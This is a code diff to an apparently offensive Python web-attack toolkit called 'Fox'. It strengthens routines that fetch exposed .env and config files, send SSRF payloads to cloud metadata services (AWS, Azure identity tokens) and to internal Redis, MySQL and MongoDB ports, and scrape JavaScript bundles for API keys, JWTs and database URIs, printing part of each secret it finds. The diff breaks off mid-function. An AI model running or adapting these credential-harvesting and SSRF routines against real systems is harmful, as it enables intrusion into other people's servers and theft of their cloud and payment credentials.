@@ -92,6 +92,119 @@ import warnings
 warnings.filterwarnings('ignore')
 
 # ═══════════════════════════════════════════════════════════════════════════
+# FOX'S VALIDATION HELPERS - NO MORE FALSE POSITIVES
+# ═══════════════════════════════════════════════════════════════════════════
+
+def is_html_response(text: str, headers: dict = None) -> bool:
+    """
+    STRICT HTML detection - rejects SPA fallback pages.
+    Returns True if response is actually HTML (not a file/secret/metadata).
+    """
+    body = text or ""
+    prefix = body.lstrip()[:512].lower()
+    
+    # Check for HTML doctype or tag
+    if prefix.startswith("<!doctype") or prefix.startswith("<html"):
+        return True
+    
+    # Check for HTML structure
+    if "<html" in prefix and ("<head" in prefix or "<body" in prefix or "</html>" in body.lower()[:4096]):
+        return True
+    
+    # Check Content-Type header
+    if headers:
+        ctype = (headers.get("content-type") or headers.get("Content-Type") or "").lower()
+        if "text/html" in ctype and ("<html" in body.lower()[:4096] or "<!doctype" in body.lower()[:4096]):
+            return True
+    
+    return False
+
+def validate_stripe_key(token: str) -> bool:
+    """Validate EXACT Stripe key format."""
+    if token.startswith('sk_live_') and len(token) == 32:
+        return token[8:].replace('_', '').replace('-', '').isalnum()
+    if token.startswith('pk_live_') and len(token) == 32:
+        return token[8:].replace('_', '').replace('-', '').isalnum()
+    if token.startswith('sk_test_') and len(token) == 32:
+        return token[8:].replace('_', '').replace('-', '').isalnum()
+    return False
+
+def validate_aws_key(token: str) -> bool:
+    """Validate EXACT AWS access key format."""
+    if not token.startswith('AKIA'):
+        return False
+    if len(token) != 20:
+        return False
+    # AWS keys are UPPERCASE after AKIA
+    return token[4:].isupper() and token[4:].isalnum()
+
+def validate_google_api_key(token: str) -> bool:
+    """Validate EXACT Google API key format."""
+    if not token.startswith('AIza'):
+        return False
+    if len(token) != 39:  # AIza + 35 chars
+        return False
+    return token[4:].replace('_', '').replace('-', '').isalnum()
+
+def validate_jwt_token(token: str) -> bool:
+    """Validate JWT has decodable header/payload."""
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+        
+        # Decode header
+        header_b64 = parts[0]
+        header_b64 += '=' * (4 - len(header_b64) % 4)
+        header = json.loads(base64.urlsafe_b64decode(header_b64))
+        
+        if not isinstance(header, dict) or 'alg' not in header:
+            return False
+        
+        # Decode payload
+        payload_b64 = parts[1]
+        payload_b64 += '=' * (4 - len(payload_b64) % 4)
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+        
+        if not isinstance(payload, dict):
+            return False
+        
+        return True
+    except:
+        return False
+
+def is_placeholder_value(value: str) -> bool:
+    """Reject common placeholder values."""
+    if not value or len(value) < 5:
+        return True
+    
+    placeholders = [
+        'your_key_here', 'your_api_key', 'your_secret', 'change_me', 'changeme',
+        'example', 'sample', 'test', 'demo', 'null', 'undefined', 'none',
+        'todo', 'fixme', 'xxx', '***', '...', 'placeholder'
+    ]
+    
+    value_lower = value.lower().strip()
+    
+    for placeholder in placeholders:
+        if placeholder in value_lower:
+            return True
+    
+    # Check for repeated characters (xxxx, ****, ...)
+    if len(set(value)) < 3:
+        return True
+    
+    # Check for template syntax
+    if value.startswith('<') and value.endswith('>'):
+        return True
+    if value.startswith('${') and value.endswith('}'):
+        return True
+    if value.startswith('{{') and value.endswith('}}'):
+        return True
+    
+    return False
+
+# ═══════════════════════════════════════════════════════════════════════════
 # FOX'S SIGNATURE BANNER
 # ═══════════════════════════════════════════════════════════════════════════
 
@@ -414,10 +527,10 @@ class CodeWordAttacks:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # ACS - Application Configuration Store (Config File Exposure) - WITH REAL DATA EXTRACTION
+    # ACS - Application Configuration Store (Config File Exposure) - WITH STRICT SECRET VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def attack_ACS(self, target: str) -> List[Vulnerability]:
-        """Configuration file and secret exposure - ONLY report if actual secrets extracted"""
+        """Configuration file and secret exposure - ONLY report VALIDATED secrets"""
         vulns = []
         
         config_files = [
@@ -436,39 +549,84 @@ class CodeWordAttacks:
                 # PHASE 1: File exists and has content
                 if r.status_code == 200 and len(r.text) > 10:
                     # PHASE 2: Verify it's NOT HTML/SPA fallback
-                    if not r.text.strip().startswith('<html') and not r.text.strip().startswith('<!DOCTYPE'):
+                    if not is_html_response(r.text, dict(r.headers)):
                         
                         # PHASE 3: Extract ACTUAL secrets (not just keywords)
                         import re
                         extracted_secrets = {}
                         
-                        # API key extraction patterns - must match actual key format
-                        api_patterns = {
-                            'API_KEY': r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                            'SECRET': r'(?:secret|secret_key)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                            'TOKEN': r'(?:token|auth_token)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                            'PASSWORD': r'(?:password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?',
-                            'AWS_KEY': r'(?:aws_access_key_id|AWS_ACCESS_KEY_ID)\s*[:=]\s*["\']?(AKIA[0-9A-Z]{16})["\']?',
-                            'DB_STRING': r'(?:database_url|db_uri|connection_string)\s*[:=]\s*["\']?([^"\'\s]{20,})["\']?',
-                        }
+                        # For .env files, validate key=value format
+                        if file_path.startswith('/.env'):
+                            for line in r.text.split('\n'):
+                                line = line.strip()
+                                if not line or line.startswith('#') or '=' not in line:
+                                    continue
+                                
+                                key, value = line.split('=', 1)
+                                key = key.strip()
+                                value = value.strip().strip('"\'')
+                                
+                                # Skip invalid keys
+                                if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{1,80}", key):
+                                    continue
+                                
+                                # Skip placeholders
+                                if is_placeholder_value(value) or len(value) < 8:
+                                    continue
+                                
+                                # Extract if key looks secret-related
+                                if re.search(r'(secret|private|key|token|password|api|database|connection)', key, re.I):
+                                    # Validate the actual value format
+                                    if validate_stripe_key(value):
+                                        extracted_secrets[key] = 'STRIPE_KEY'
+                                    elif validate_aws_key(value):
+                                        extracted_secrets[key] = 'AWS_KEY'
+                                    elif validate_google_api_key(value):
+                                        extracted_secrets[key] = 'GOOGLE_API_KEY'
+                                    elif validate_jwt_token(value):
+                                        extracted_secrets[key] = 'JWT_TOKEN'
+                                    elif len(value) > 20:  # Generic secret (long enough)
+                                        extracted_secrets[key] = f'SECRET ({len(value)} chars)'
                         
-                        for secret_type, pattern in api_patterns.items():
-                            matches = re.findall(pattern, r.text, re.IGNORECASE)
-                            if matches:
-                                # Filter out obvious false positives
-                                real_secrets = [m for m in matches if m not in ['your_key_here', 'example', 'test', 'xxx', '***', 'null', 'none', '']]
-                                if real_secrets:
-                                    extracted_secrets[secret_type] = real_secrets[0]
+                        else:
+                            # For other config files, extract known secret patterns
+                            api_patterns = {
+                                'API_KEY': r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
+                                'SECRET': r'(?:secret|secret_key)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
+                                'TOKEN': r'(?:token|auth_token)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
+                                'PASSWORD': r'(?:password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?',
+                                'AWS_KEY': r'(?:aws_access_key_id|AWS_ACCESS_KEY_ID)\s*[:=]\s*["\']?(AKIA[0-9A-Z]{16})["\']?',
+                            }
+                            
+                            for secret_type, pattern in api_patterns.items():
+                                matches = re.findall(pattern, r.text, re.IGNORECASE)
+                                if matches:
+                                    real_secrets = []
+                                    for m in matches:
+                                        # Skip placeholders
+                                        if not is_placeholder_value(m):
+                                            # Validate format if applicable
+                                            if secret_type == 'AWS_KEY' and validate_aws_key(m):
+                                                real_secrets.append(m)
+                                            elif secret_type != 'AWS_KEY' and len(m) > 10:
+                                                real_secrets.append(m)
+                                    
+                                    if real_secrets:
+                                        extracted_secrets[secret_type] = real_secrets[0][:30] + '...'
                         
-                        # ONLY report if we actually extracted secrets
+                        # ONLY report if we actually extracted VALIDATED secrets
                         if extracted_secrets:
+                            print(Colors.critical(f"\n      [💀 SECRETS EXTRACTED] {file_path}: {len(extracted_secrets)} secrets"))
+                            for key, val in list(extracted_secrets.items())[:5]:
+                                print(Colors.success(f"        {key}: {val}"))
+                            
                             vulns.append(Vulnerability(
                                 type="ACS_CONFIG_EXPOSURE",
                                 severity="CRITICAL",
                                 location=file_path,
-                                evidence=f"Extracted {len(extracted_secrets)} secrets: {', '.join(extracted_secrets.keys())}",
-                                description=f"Configuration file exposed with real secrets: {file_path}",
-                                remediation="Block access to sensitive files via web server config, use environment variables",
+                                evidence=f"Extracted {len(extracted_secrets)} validated secrets: {', '.join(list(extracted_secrets.keys())[:10])}",
+                                description=f"Configuration file exposed with validated secrets: {file_path}",
+                                remediation="Block access to sensitive files via web server config, rotate all exposed credentials",
                                 exploitable=True
                             ))
                 
@@ -976,10 +1134,10 @@ class WebExploitationArsenal:
 
     
     # ─────────────────────────────────────────────────────────────────────
-    # SSRF ATTACKS - DEEP CLOUD METADATA SCRAPING
+    # SSRF ATTACKS - DEEP CLOUD METADATA SCRAPING - WITH STRICT JSON VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def attack_ssrf(self, target: str) -> List[Vulnerability]:
-        """Server-Side Request Forgery - WITH CLOUD METADATA EXTRACTION"""
+        """Server-Side Request Forgery - WITH STRICT CLOUD METADATA FORMAT VALIDATION"""
         vulns = []
         
         print(Colors.info(f"    [→] Testing SSRF + Cloud metadata endpoints..."))
@@ -1001,25 +1159,12 @@ class WebExploitationArsenal:
             ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure Instance Metadata'),
             ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Identity Token'),
             
-            # DigitalOcean Metadata
-            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
-            ('http://169.254.169.254/metadata/v1.json', 'DigitalOcean Metadata JSON'),
-            
-            # Oracle Cloud
-            ('http://169.254.169.254/opc/v1/instance/', 'Oracle Cloud Metadata'),
-            
             # Internal services
-            ('http://localhost', 'Localhost'),
-            ('http://127.0.0.1', '127.0.0.1'),
-            ('http://0.0.0.0', '0.0.0.0'),
-            ('http://[::1]', 'IPv6 Localhost'),
             ('http://localhost:6379', 'Redis'),
             ('http://localhost:3306', 'MySQL'),
             ('http://localhost:5432', 'PostgreSQL'),
             ('http://localhost:27017', 'MongoDB'),
             ('http://localhost:9200', 'Elasticsearch'),
-            ('http://localhost:8080', 'Internal Web Server'),
-            ('http://localhost:8888', 'Jupyter/Internal Service'),
         ]
         
         test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'link', 'src', 'fetch', 'uri', 'path']
@@ -1027,72 +1172,91 @@ class WebExploitationArsenal:
         
         for endpoint in test_endpoints:
             for param in test_params[:5]:
-                for payload_url, description in ssrf_payloads[:15]:  # Test top 15 payloads
+                for payload_url, description in ssrf_payloads[:10]:  # Test top 10 payloads
                     try:
                         url = f"{urljoin(target, endpoint)}?{param}={quote(payload_url)}"
                         r = self.session.get(url, timeout=5)
                         
-                        # Check for successful SSRF with cloud metadata extraction
-                        cloud_indicators = {
-                            'aws': ['ami-', 'instance-id', 'availabilityZone', 'privateIp', 'instanceType', 'region'],
-                            'gcp': ['instance-', 'project-', 'computeMetadata', 'serviceAccounts'],
-                            'azure': ['vmId', 'subscriptionId', 'resourceGroupName', 'location'],
-                            'digitalocean': ['droplet_id', 'region', 'public_keys'],
-                            'redis': ['redis_version', 'redis_mode', 'role:master'],
-                            'mysql': ['mysql', 'Server version', 'Connection id'],
-                            'postgres': ['PostgreSQL', 'server_version'],
-                            'mongo': ['MongoDB', 'version', 'db version'],
-                            'elasticsearch': ['cluster_name', 'cluster_uuid', 'version'],
-                        }
-                        
-                        response_text = r.text.lower()
-                        extracted_data = None
-                        
-                        for cloud_type, indicators in cloud_indicators.items():
-                            if any(indicator.lower() in response_text for indicator in indicators):
-                                extracted_data = cloud_type
-                                
-                                print(Colors.critical(f"\n      [🔥 SSRF SUCCESS] {endpoint}?{param}= → {description}"))
+                        # PHASE 1: Must not be HTML (reject Vercel/Cloudflare/SPA)
+                        if r.status_code == 200 and not is_html_response(r.text, dict(r.headers)):
+                            
+                            # PHASE 2: STRICT cloud metadata format validation
+                            response_text = r.text or ""
+                            cloud_type = None
+                            extracted_data = {}
+                            
+                            # AWS Metadata Format Validation
+                            if 'ami-' in response_text or 'instance-id' in response_text:
+                                try:
+                                    # Try JSON format
+                                    data = json.loads(response_text)
+                                    if isinstance(data, dict) and ('instanceId' in data or 'privateIp' in data or 'region' in data):
+                                        cloud_type = 'aws'
+                                        extracted_data = data
+                                except:
+                                    # Try plaintext format (newline-separated keys)
+                                    lines = response_text.strip().split('\n')
+                                    if any(line in ['ami-id', 'ami-launch-index', 'instance-id', 'instance-type'] for line in lines):
+                                        cloud_type = 'aws'
+                                        extracted_data = {'metadata_keys': lines[:10]}
+                            
+                            # Azure Metadata Format Validation
+                            elif 'vmId' in response_text or 'subscriptionId' in response_text:
+                                try:
+                                    data = json.loads(response_text)
+                                    if isinstance(data, dict) and 'compute' in data:
+                                        compute = data['compute']
+                                        if isinstance(compute, dict) and ('vmId' in compute or 'location' in compute):
+                                            cloud_type = 'azure'
+                                            extracted_data = data
+                                except:
+                                    pass
+                            
+                            # GCP Metadata Format Validation
+                            elif 'project-id' in response_text or 'instance-id' in response_text:
+                                lines = response_text.strip().split('\n')
+                                if 'project-id' in lines or 'instance-id' in lines:
+                                    cloud_type = 'gcp'
+                                    extracted_data = {'metadata_keys': lines[:10]}
+                            
+                            # Redis Format Validation
+                            elif 'redis_version' in response_text.lower() and 'role:' in response_text.lower():
+                                cloud_type = 'redis'
+                                extracted_data = {'preview': response_text[:200]}
+                            
+                            # Only report if we validated ACTUAL cloud metadata
+                            if cloud_type:
+                                print(Colors.critical(f"\n      [🔥 SSRF VALIDATED] {endpoint}?{param}= → {description}"))
                                 print(Colors.critical(f"      [💀 EXTRACTED] {cloud_type.upper()} metadata:"))
-                                print(Colors.success(f"        {r.text[:300]}..."))
+                                print(Colors.success(f"        {str(extracted_data)[:300]}..."))
                                 
-                                # Try to extract specific credentials from response
+                                # Try to extract AWS credentials if present
                                 credentials_found = {}
-                                
-                                if cloud_type == 'aws':
+                                if cloud_type == 'aws' and isinstance(extracted_data, dict):
                                     import re
-                                    # Look for AWS credentials format
-                                    access_key = re.search(r'AKIA[0-9A-Z]{16}', r.text)
-                                    secret_key = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', r.text)
-                                    token = re.search(r'"Token"\s*:\s*"([^"]+)"', r.text)
+                                    access_key = re.search(r'AKIA[0-9A-Z]{16}', response_text)
+                                    secret_key_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', response_text)
+                                    token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', response_text)
                                     
-                                    if access_key:
+                                    if access_key and validate_aws_key(access_key.group()):
                                         credentials_found['AWS_ACCESS_KEY'] = access_key.group()
-                                    if secret_key:
-                                        credentials_found['AWS_SECRET_KEY'] = secret_key.group(1)[:50] + '...'
-                                    if token:
-                                        credentials_found['AWS_TOKEN'] = token.group(1)[:50] + '...'
+                                    if secret_key_match:
+                                        credentials_found['AWS_SECRET_KEY'] = secret_key_match.group(1)[:50] + '...'
+                                    if token_match:
+                                        credentials_found['AWS_TOKEN'] = token_match.group(1)[:50] + '...'
                                     
                                     if credentials_found:
                                         print(Colors.critical(f"      [💀💀💀 AWS CREDENTIALS EXTRACTED]:"))
                                         for key, val in credentials_found.items():
                                             print(Colors.success(f"        {key}: {val}"))
                                 
-                                elif cloud_type == 'gcp':
-                                    import re
-                                    # Look for GCP access token
-                                    token = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text)
-                                    if token:
-                                        credentials_found['GCP_ACCESS_TOKEN'] = token.group(1)[:50] + '...'
-                                        print(Colors.critical(f"      [💀💀💀 GCP TOKEN EXTRACTED]: {token.group(1)[:50]}..."))
-                                
                                 vulns.append(Vulnerability(
                                     type="SSRF_CLOUD_METADATA_LEAKED",
                                     severity="CRITICAL",
                                     location=f"{endpoint}?{param}=",
                                     payload=payload_url,
-                                    evidence=f"{cloud_type.upper()} metadata extracted | Credentials: {', '.join(credentials_found.keys()) if credentials_found else 'none'}",
-                                    description=f"SSRF vulnerability exposes {description} - {cloud_type.upper()}",
+                                    evidence=f"{cloud_type.upper()} metadata validated | Credentials: {', '.join(credentials_found.keys()) if credentials_found else 'none'} | Data: {str(extracted_data)[:200]}",
+                                    description=f"SSRF vulnerability exposes {description} - {cloud_type.upper()} format validated",
                                     remediation="Validate URLs against whitelist, disable internal DNS resolution, use IMDSv2 for AWS",
                                     exploitable=True,
                                     exploit_code=f"curl '{url}'"
@@ -1380,35 +1544,35 @@ class FoxReverseEngineeringToolkit:
             self.session.proxies.update({'http': config.proxy, 'https': config.proxy})
     
     # ─────────────────────────────────────────────────────────────────────
-    # MEMORY SCANNING - AOB (Array of Bytes) Pattern Search - WITH VALIDATION
+    # MEMORY SCANNING - AOB (Array of Bytes) Pattern Search - WITH STRICT VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def scan_memory_patterns(self, target: str) -> List[Vulnerability]:
         """
-        Scan for sensitive patterns in application responses - ONLY report validated keys.
+        Scan for sensitive patterns - STRICT FORMAT VALIDATION ONLY.
         Adapted from AOB (Array of Bytes) scanning technique.
         """
         vulns = []
         
-        # Patterns to search for with strict validation
+        # Patterns with STRICT validation functions
         sensitive_patterns = [
             # Stripe keys (very specific format)
-            (r'sk_live_[A-Za-z0-9]{24}', 'STRIPE_SECRET_KEY', lambda m: m.startswith('sk_live_')),
-            (r'sk_test_[A-Za-z0-9]{24}', 'STRIPE_TEST_KEY', lambda m: m.startswith('sk_test_')),
-            (r'pk_live_[A-Za-z0-9]{24}', 'STRIPE_PUBLIC_KEY', lambda m: m.startswith('pk_live_')),
+            (r'sk_live_[A-Za-z0-9]{24}', 'STRIPE_SECRET_KEY', validate_stripe_key),
+            (r'sk_test_[A-Za-z0-9]{24}', 'STRIPE_TEST_KEY', validate_stripe_key),
+            (r'pk_live_[A-Za-z0-9]{24}', 'STRIPE_PUBLIC_KEY', validate_stripe_key),
             
             # AWS credentials (exact format)
-            (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY', lambda m: m.startswith('AKIA') and len(m) == 20),
+            (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY', validate_aws_key),
             
-            # Private keys (must have full structure)
-            (r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----[\s\S]{100,}-----END \1 PRIVATE KEY-----', 'PRIVATE_KEY', lambda m: '-----BEGIN' in m and '-----END' in m),
+            # Google API keys
+            (r'AIza[0-9A-Za-z_-]{35}', 'GOOGLE_API_KEY', validate_google_api_key),
             
-            # JWT tokens (must have 3 parts)
-            (r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}', 'JWT_TOKEN', lambda m: m.count('.') == 2 and m.startswith('eyJ')),
+            # JWT tokens (must be decodable)
+            (r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}', 'JWT_TOKEN', validate_jwt_token),
             
             # Database connection strings (must have protocol + credentials)
-            (r'mongodb(\+srv)?://[^:\s]+:[^@\s]+@[^\s/]+', 'MONGODB_URI', lambda m: '://' in m and '@' in m and ':' in m),
-            (r'postgresql://[^:\s]+:[^@\s]+@[^\s/]+', 'POSTGRESQL_URI', lambda m: 'postgresql://' in m and '@' in m),
-            (r'mysql://[^:\s]+:[^@\s]+@[^\s/]+', 'MYSQL_URI', lambda m: 'mysql://' in m and '@' in m),
+            (r'mongodb(\+srv)?://[^:\s]+:[^@\s]+@[^\s/]+', 'MONGODB_URI', lambda x: '://' in x and '@' in x and ':' in x),
+            (r'postgresql://[^:\s]+:[^@\s]+@[^\s/]+', 'POSTGRESQL_URI', lambda x: 'postgresql://' in x and '@' in x),
+            (r'mysql://[^:\s]+:[^@\s]+@[^\s/]+', 'MYSQL_URI', lambda x: 'mysql://' in x and '@' in x),
         ]
         
         test_endpoints = [
@@ -1421,25 +1585,37 @@ class FoxReverseEngineeringToolkit:
                 url = urljoin(target, endpoint)
                 r = self.session.get(url, timeout=5, allow_redirects=False)
                 
-                # PHASE 1: Must not be HTML page
-                if r.status_code == 200 and not r.text.strip().startswith('<html'):
+                # PHASE 1: Must not be HTML page (reject Vercel/SPA fallbacks)
+                if r.status_code == 200 and not is_html_response(r.text, dict(r.headers)):
                     
                     # PHASE 2: Scan response for sensitive patterns
                     for pattern, pattern_name, validator in sensitive_patterns:
                         import re
                         matches = re.findall(pattern, r.text, re.DOTALL)
                         
-                        # PHASE 3: Validate each match
-                        validated_matches = [m for m in matches if validator(m if isinstance(m, str) else m[0] if isinstance(m, tuple) else str(m))]
+                        # PHASE 3: Validate each match with STRICT format check
+                        validated_matches = []
+                        for match in matches:
+                            match_str = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
+                            
+                            # Skip placeholders
+                            if is_placeholder_value(match_str):
+                                continue
+                            
+                            # Validate exact format
+                            if validator(match_str):
+                                validated_matches.append(match_str)
                         
                         if validated_matches:
-                            # ONLY report if we have VALIDATED matches
+                            # ONLY report VALIDATED matches
+                            print(Colors.critical(f"\n      [💀 VALIDATED] {pattern_name}: {validated_matches[0][:30]}..."))
+                            
                             vulns.append(Vulnerability(
                                 type="MEMORY_SCAN_SENSITIVE_DATA",
                                 severity="CRITICAL",
                                 location=endpoint,
-                                evidence=f"Found validated {pattern_name}: {str(validated_matches[0])[:30]}...",
-                                description=f"Sensitive data exposed: {pattern_name}",
+                                evidence=f"Validated {pattern_name}: {validated_matches[0][:30]}... (total: {len(validated_matches)} matches)",
+                                description=f"Sensitive data exposed with validated format: {pattern_name}",
                                 remediation="Remove secrets from responses, use environment variables",
                                 exploitable=True
                             ))
@@ -1594,16 +1770,16 @@ class FoxReverseEngineeringToolkit:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # DISASSEMBLY - JavaScript DEEP SOURCE ANALYSIS + DEOBFUSCATION
+    # DISASSEMBLY - JavaScript DEEP SOURCE ANALYSIS + STRICT VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def disassemble_javascript(self, target: str) -> List[Vulnerability]:
         """
-        DEEP JavaScript analysis - deobfuscate, extract ALL secrets.
+        DEEP JavaScript analysis - STRICT credential format validation.
         Adapted from binary disassembly techniques.
         """
         vulns = []
         
-        print(Colors.info(f"    [→] DEEP JavaScript analysis - extracting ALL secrets..."))
+        print(Colors.info(f"    [→] DEEP JavaScript analysis - STRICT validation..."))
         
         try:
             # Fetch main page
@@ -1641,81 +1817,68 @@ class FoxReverseEngineeringToolkit:
                     js_response = self.session.get(js_url, timeout=5)
                     
                     if js_response.status_code == 200 and len(js_response.text) > 100:
+                        # PHASE 1: Must not be HTML
+                        if is_html_response(js_response.text, dict(js_response.headers)):
+                            continue
+                        
                         js_content = js_response.text
                         analyzed_count += 1
                         
                         print(Colors.info(f"      [→] Analyzing {js_file} ({len(js_content)} bytes)"))
                         
-                        # DEEP SECRET EXTRACTION
+                        # PHASE 2: STRICT SECRET EXTRACTION with format validation
                         secret_patterns = [
-                            # API Keys with context
-                            (r'(?:apiKey|api_key|API_KEY)["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'API_KEY'),
+                            # Stripe keys (EXACT format)
+                            ('STRIPE_LIVE_SECRET', r'sk_live_[A-Za-z0-9]{24}', validate_stripe_key),
+                            ('STRIPE_LIVE_PUBLIC', r'pk_live_[A-Za-z0-9]{24}', validate_stripe_key),
+                            ('STRIPE_TEST', r'sk_test_[A-Za-z0-9]{24}', validate_stripe_key),
                             
-                            # Stripe keys (exact format)
-                            (r'(sk_live_[A-Za-z0-9]{24,})', 'STRIPE_SECRET'),
-                            (r'(pk_live_[A-Za-z0-9]{24,})', 'STRIPE_PUBLIC'),
-                            (r'(sk_test_[A-Za-z0-9]{24,})', 'STRIPE_TEST'),
+                            # AWS keys (EXACT format - UPPERCASE only)
+                            ('AWS_ACCESS_KEY', r'AKIA[0-9A-Z]{16}', validate_aws_key),
                             
-                            # Firebase config
-                            (r'firebase[A-Za-z]*["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', 'FIREBASE'),
-                            (r'apiKey["\']?\s*:\s*["\']([^"\']{30,})["\']', 'FIREBASE_API'),
+                            # Google API keys (EXACT format)
+                            ('GOOGLE_API_KEY', r'AIza[0-9A-Za-z_-]{35}', validate_google_api_key),
                             
-                            # AWS keys
-                            (r'(AKIA[0-9A-Z]{16})', 'AWS_ACCESS_KEY'),
-                            (r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([^"\']{40})["\']', 'AWS_SECRET'),
+                            # JWT tokens (must be decodable)
+                            ('JWT_TOKEN', r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}', validate_jwt_token),
                             
-                            # Google API keys
-                            (r'AIza[0-9A-Za-z_-]{35}', 'GOOGLE_API'),
+                            # Firebase config (specific context)
+                            ('FIREBASE_API', r'apiKey["\']?\s*:\s*["\']([^"\']{30,})["\']', lambda x: len(x) > 30 and not is_placeholder_value(x)),
                             
-                            # Generic secrets
-                            (r'(?:secret|SECRET|Secret)[A-Za-z]*["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'SECRET'),
-                            
-                            # Tokens
-                            (r'(?:token|TOKEN|Token)[A-Za-z]*["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'TOKEN'),
-                            
-                            # Private keys
-                            (r'(-----BEGIN[A-Z\s]+PRIVATE KEY-----)', 'PRIVATE_KEY'),
-                            
-                            # Database URIs
-                            (r'(mongodb(?:\+srv)?://[^\s"\']+)', 'MONGODB_URI'),
-                            (r'(postgres(?:ql)?://[^\s"\']+)', 'POSTGRES_URI'),
-                            (r'(mysql://[^\s"\']+)', 'MYSQL_URI'),
-                            
-                            # JWT tokens
-                            (r'(eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', 'JWT_TOKEN'),
-                            
-                            # Webhook URLs
-                            (r'(https?://(?:discord\.com/api/webhooks|hooks\.slack\.com)/[^\s"\']+)', 'WEBHOOK_URL'),
-                            
-                            # Internal API endpoints
-                            (r'(?:baseURL|apiUrl|API_URL)["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'API_ENDPOINT'),
+                            # Database URIs (must have credentials)
+                            ('MONGODB_URI', r'mongodb(?:\+srv)?://[^:\s]+:[^@\s]+@[^\s"\']+', lambda x: '://' in x and '@' in x and ':' in x),
+                            ('POSTGRES_URI', r'postgres(?:ql)?://[^:\s]+:[^@\s]+@[^\s"\']+', lambda x: 'postgres' in x and '@' in x),
                         ]
                         
-                        for pattern, secret_type in secret_patterns:
+                        for kind, pattern, validator in secret_patterns:
                             matches = re.findall(pattern, js_content, re.IGNORECASE)
                             
                             if matches:
-                                # Filter out obvious false positives
-                                real_secrets = []
+                                # PHASE 3: Validate each match
+                                validated = []
                                 for match in matches:
                                     match_str = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
                                     
-                                    # Skip common placeholders
-                                    skip_values = ['your_key_here', 'example', 'test', 'xxx', '***', 'null', 'undefined', 
-                                                   'YOUR_API_KEY', 'INSERT_KEY_HERE', '0000000000', 'XXXXXXXX']
+                                    # Skip placeholders
+                                    if is_placeholder_value(match_str):
+                                        continue
                                     
-                                    if match_str and len(match_str) > 10 and not any(skip in match_str for skip in skip_values):
-                                        real_secrets.append(match_str)
+                                    # Validate exact format
+                                    try:
+                                        if validator(match_str):
+                                            validated.append(match_str)
+                                    except:
+                                        pass
                                 
-                                if real_secrets:
-                                    unique_secrets = list(set(real_secrets))[:5]  # Top 5 unique
+                                if validated:
+                                    unique_validated = list(set(validated))[:3]  # Top 3 unique
                                     
-                                    if secret_type not in all_secrets_found:
-                                        all_secrets_found[secret_type] = []
-                                    all_secrets_found[secret_type].extend(unique_secrets)
+                                    if kind not in all_secrets_found:
+                                        all_secrets_found[kind] = []
+                                    all_secrets_found[kind].extend(unique_validated)
                                     
-                                    print(Colors.critical(f"        [💀 FOUND] {len(unique_secrets)} {secret_type}:"))
-                                    for sec in unique_secrets[:3]:
+                                    print(Colors.critical(f"        [💀 VALIDATED] {len(unique_validated)} {kind}:"))
+                                    for sec in unique_validated:
                                         print(Colors.success(f"          {sec[:60]}..."))
                         
                         time.sleep(self.config.delay)
@@ -1726,19 +1889,19 @@ class FoxReverseEngineeringToolkit:
             if all_secrets_found:
                 total_secrets = sum(len(v) for v in all_secrets_found.values())
                 
-                print(Colors.critical(f"\n      [🔥 TOTAL EXTRACTED] {total_secrets} secrets from {analyzed_count} JS files"))
+                print(Colors.critical(f"\n      [🔥 TOTAL VALIDATED] {total_secrets} secrets from {analyzed_count} JS files"))
                 
                 vulns.append(Vulnerability(
-                    type="JS_SECRETS_EXTRACTED",
+                    type="JS_SECRETS_VALIDATED",
                     severity="CRITICAL",
                     location="JavaScript bundles",
-                    evidence=f"Extracted {total_secrets} secrets from {analyzed_count} files: {', '.join(all_secrets_found.keys())}",
-                    description=f"Secrets exposed in JavaScript: {', '.join(all_secrets_found.keys())}",
-                    remediation="Never hardcode secrets in client-side code, use secure backend APIs",
+                    evidence=f"Validated {total_secrets} secrets from {analyzed_count} files: {', '.join(all_secrets_found.keys())}",
